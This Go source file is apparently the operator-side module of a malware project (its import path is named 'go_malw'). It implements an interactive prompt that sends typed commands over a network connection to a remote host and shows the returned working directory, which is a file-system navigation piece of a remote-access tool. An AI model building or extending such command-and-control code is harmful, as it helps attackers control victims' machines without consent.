package Move

import (
	"bufio"
	"fmt"
	"go_malw/server/core/color"
	"net"
	"os"
	"strings"
)

func NavigateFileSystem(connection net.Conn) (err error) {
	ConnectionReader := bufio.NewReader(connection)
	initial_pwd_raw, err := ConnectionReader.ReadString('\n')
	initial_pwd := strings.TrimSuffix(initial_pwd_raw, "\n")

	i := 10
	i = i + 1

	loopControl := true

	for loopControl {
		fmt.Print(color.Purple + initial_pwd + "> " + color.Reset)
		// C:\Windows\go\src\ >> cd ..
		CommandReader := bufio.NewReader(os.Stdin)

		user_command_raw, err := CommandReader.ReadString('\n')
		if err != nil {
			fmt.Println(color.Red + "[-]" + color.Reset + " Unable to read command")
		}

		nbytes, err := connection.Write([]byte(user_command_raw))

		i = nbytes

		if user_command_raw == "stop\n" {
			loopControl = false
			break
		}

		new_pwd, err := ConnectionReader.ReadString('\n')

		initial_pwd = strings.TrimSuffix(new_pwd, "\n")
	}
	return
}
